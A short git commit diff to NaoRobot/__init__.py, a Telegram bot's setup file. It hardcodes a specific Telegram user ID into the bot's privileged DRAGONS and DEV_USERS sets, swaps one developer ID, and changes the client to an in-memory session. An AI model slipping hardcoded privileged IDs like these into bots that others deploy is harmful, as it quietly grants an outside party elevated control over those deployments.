6cb048cc15b0eca478f6bcb1c54f2c6e458ca3ef
Muhammad Sena Al-Kahfi <87056837+KennedyProject@users.noreply.github.com>
2021-10-31 15:33:11 +0700

    Update __init__.py

--- NaoRobot/__init__.py
+++ NaoRobot/__init__.py
@@ -203,8 +203,9 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 DRAGONS.add(OWNER_ID)
+DRAGONS.add(1829047705)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1805518906)
+DEV_USERS.add(1829047705)
 DEV_USERS.add(1979717764)
 
 
@@ -220,7 +221,7 @@ else:
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("nao", API_ID, API_HASH)
+telethn = TelegramClient(MemorySession(), API_ID, API_HASH)
 pbot = Client("naorobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
